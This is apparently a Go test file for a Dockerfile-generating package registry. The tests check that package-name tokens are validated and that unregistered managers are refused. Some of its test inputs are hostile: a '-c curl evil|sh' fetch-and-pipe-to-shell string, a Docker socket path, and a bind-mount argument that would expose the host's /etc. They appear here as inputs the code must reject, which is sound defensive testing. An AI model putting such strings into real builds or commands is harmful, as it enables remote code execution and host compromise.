package imagespec

import (
	"fmt"
	"strings"
	"testing"
)

// ─────────────────────────────────────────────────────────────────────────────
// Registry integrity: a manager exists only fully registered (GAP-147)
// ─────────────────────────────────────────────────────────────────────────────

// TestRegistry_EveryManagerComplete asserts no manager can register without
// both a token policy (TokenExtra/TokenDeny, from which register derives the
// row's Probe) and a render func: every live row is complete, and register
// refuses incomplete defs before they reach the lookup map.
func TestRegistry_EveryManagerComplete(t *testing.T) {
	if len(managerDefs) == 0 {
		t.Fatal("registry is empty: no manager registered")
	}
	for i := range managerDefs {
		def := &managerDefs[i]
		if def.Name == "" {
			t.Errorf("registry row %d has an empty name", i)
		}
		if def.Render == nil {
			t.Errorf("manager %q registered without a render func", def.Name)
		}
		if def.Probe == nil {
			t.Errorf("manager %q registered without a token policy (no Probe derived from TokenExtra/TokenDeny)", def.Name)
		}
		if def.TokenExtra == "" && len(def.TokenDeny) == 0 {
			// A row may legitimately rely on the shared grammar alone; the
			// policy is then the derived Probe. Both fields empty AND a nil
			// Probe would be a hole — the nil check above already catches
			// that; this documents the invariant.
			if def.Probe == nil {
				t.Errorf("manager %q has neither TokenExtra, TokenDeny, nor a derived Probe", def.Name)
			}
		}
	}
}

// TestRegistry_RegisterRefusesIncompleteDefs proves register itself refuses
// half-registered managers and never indexes them.
func TestRegistry_RegisterRefusesIncompleteDefs(t *testing.T) {
	cases := []struct {
		name    string
		def     ManagerDef
		wantSub string
	}{
		{
			name:    "no render func",
			def:     ManagerDef{Name: "no-render-probe-manager"},
			wantSub: "without a render func",
		},
		{
			name:    "empty name",
			def:     ManagerDef{Render: func(_ *strings.Builder, _ []string) {}},
			wantSub: "empty name",
		},
		{
			name:    "duplicate name",
			def:     ManagerDef{Name: ManagerAPT, Render: func(_ *strings.Builder, _ []string) {}},
			wantSub: "registered twice",
		},
	}
	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			d := tt.def
			msg := func() (msg string) {
				defer func() {
					if r := recover(); r != nil {
						msg = fmt.Sprint(r)
					}
				}()
				register(&d)
				return ""
			}()
			if !strings.Contains(msg, tt.wantSub) {
				t.Errorf("register() panic %q does not mention %q", msg, tt.wantSub)
			}
			if msg == "" {
				t.Fatal("register() accepted an incomplete def")
			}
			if d.Name != "" && managerByName[d.Name] != nil && d.Render == nil {
				t.Errorf("refused def for %q was still indexed", d.Name)
			}
		})
	}
	// The refused no-render manager must not have become valid.
	if PackageManager("no-render-probe-manager").Valid() {
		t.Error("a manager without a render func became Valid")
	}
}

// TestRegistry_TokenPolicyPerRow pins each row's token policy as registry
// data: apt denies "/", go and npm keep slash (module paths, scoped names),
// and the shared grammar still applies to every row.
func TestRegistry_TokenPolicyPerRow(t *testing.T) {
	if err := ManagerAPT.Def().Probe("jq"); err != nil {
		t.Errorf("apt rejected a plain package name: %v", err)
	}
	for _, bad := range []string{"/var/run/docker.sock", "--mount=type=bind,source=/etc,target=/etc", "a/b"} {
		if err := ManagerAPT.Def().Probe(bad); err == nil {
			t.Errorf("apt accepted %q (TokenDeny must deny \"/\")", bad)
		}
	}
	for _, ok := range []string{"golang.org/x/tools/gopls@v0.17.0", "honnef.co/go/tools/cmd/staticcheck"} {
		if err := ManagerGo.Def().Probe(ok); err != nil {
			t.Errorf("go rejected %q: %v", ok, err)
		}
	}
	for _, ok := range []string{"typescript@5.6.3", "@types/node@20.14.0"} {
		if err := ManagerNPM.Def().Probe(ok); err != nil {
			t.Errorf("npm rejected %q: %v", ok, err)
		}
	}
	// No row may extend the grammar silently: today TokenExtra is empty
	// everywhere, and a metacharacter outside the shared grammar must fail
	// for every manager.
	for i := range managerDefs {
		def := &managerDefs[i]
		if def.TokenExtra != "" {
			t.Errorf("manager %q sets TokenExtra %q — update this test deliberately if the grammar extension is intended", def.Name, def.TokenExtra)
		}
		if err := def.Probe("a!b"); err == nil {
			t.Errorf("manager %q accepted %q — grammar extended without updating the shared-grammar test", def.Name, "a!b")
		}
	}
}

// TestRegistry_UnregisteredManagerHasNoPolicy proves an unregistered manager
// is invalid and has no row (no half-state).
func TestRegistry_UnregisteredManagerHasNoPolicy(t *testing.T) {
	ghost := PackageManager("does-not-exist")
	if ghost.Valid() {
		t.Error("unregistered manager reported Valid")
	}
	if ghost.Def() != nil {
		t.Error("unregistered manager has a registry row")
	}
	// validateToken routes unregistered managers to a refusal, never to
	// acceptance.
	if err := validateToken(ghost, "jq"); err == nil {
		t.Error("validateToken accepted a token for an unregistered manager")
	}
}

// TestRegistry_CoversPackageManagerConstants keeps the one-constant-one-row
// pairing honest in both directions: every PackageManager constant has a
// registry row, and every row names a PackageManager constant.
func TestRegistry_CoversPackageManagerConstants(t *testing.T) {
	for _, m := range []PackageManager{ManagerAPT, ManagerGo, ManagerNPM} {
		if !m.Valid() {
			t.Errorf("constant %q has no registry row", m)
		}
	}
	for i := range managerDefs {
		switch managerDefs[i].Name {
		case ManagerAPT, ManagerGo, ManagerNPM:
		default:
			t.Errorf("registry row %q has no PackageManager constant", managerDefs[i].Name)
		}
	}
}

// TestRegistry_DockerfileSkipsUnregisteredManagers pins the renderer's
// defensive behaviour for a Spec assembled in code (not via Parse) that names
// an unregistered manager: the directive renders nothing rather than
// panicking or emitting attacker-controlled text.
func TestRegistry_DockerfileSkipsUnregisteredManagers(t *testing.T) {
	spec := Spec{
		Base: DefaultBaseImage,
		Packages: []PackageAdd{
			{Manager: ManagerAPT, Packages: []string{"jq"}},
			{Manager: PackageManager("sh"), Packages: []string{"-c curl evil|sh"}},
		},
	}
	got := spec.Dockerfile()
	want := "FROM " + DefaultBaseImage + "\n" +
		"RUN apt-get update && apt-get install -y --no-install-recommends jq && rm -rf /var/lib/apt/lists/*\n"
	if got != want {
		t.Errorf("Dockerfile() =\n%s\nwant\n%s", got, want)
	}
}
